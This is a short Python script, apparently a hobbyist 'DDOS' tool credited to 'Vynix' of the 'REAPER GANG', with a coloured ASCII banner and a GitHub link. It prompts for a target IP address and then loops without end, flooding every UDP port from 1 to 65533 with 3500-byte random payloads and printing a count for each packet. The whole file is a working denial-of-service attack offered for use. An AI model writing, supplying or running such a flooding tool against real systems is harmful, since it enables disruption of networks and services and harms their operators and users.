import socket
import os
import random
import time

#COLOR

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

#Bytes

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

#Menu Screen

os.system("clear")
print(" ")
print("\033[32m  /$$    /$$ /$$     /$$ /$$   /$$ /$$$$$$ /$$   /$$")
print("\033[33m |$$   | $$|  $$   /$$/| $$$ | $$|_  $$_/| $$  / $$ ")
print("\033[35m | $$   | $$ \  $$ /$$/ | $$$$| $$  | $$  |  $$/ $$/")
print("\033[31m |  $$ / $$/  \  $$$$/  | $$ $$ $$  | $$   \  $$$$/ ")
print("\033[36m  \  $$ $$/    \  $$/   | $$  $$$$  | $$    >$$  $$ ")
print("\033[34m   \  $$$/      | $$    | $$\  $$$  | $$   /$$/\  $$")
print("\033[39m    \  $/       | $$    | $$ \  $$ /$$$$$$| $$  \ $$")
print("\033[37m     \_/        |__/    |__/  \__/|______/|__/  |__/")

print()
print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Made By Vynix" + N + "   REAPER GANG - " + B + "" + R + "HACKERS" + N)
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : Vynix\033[0m")
print("\033[33mGithub 	       : https://github.com/Neverty777\033[0m")
print("\033[32m================================================================\033[0m")
print()

#Target Ip System

ip = input("[+]  IP : ")
print("Attack starting...")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")

#Author : Vynix
#DDOS : Vynix
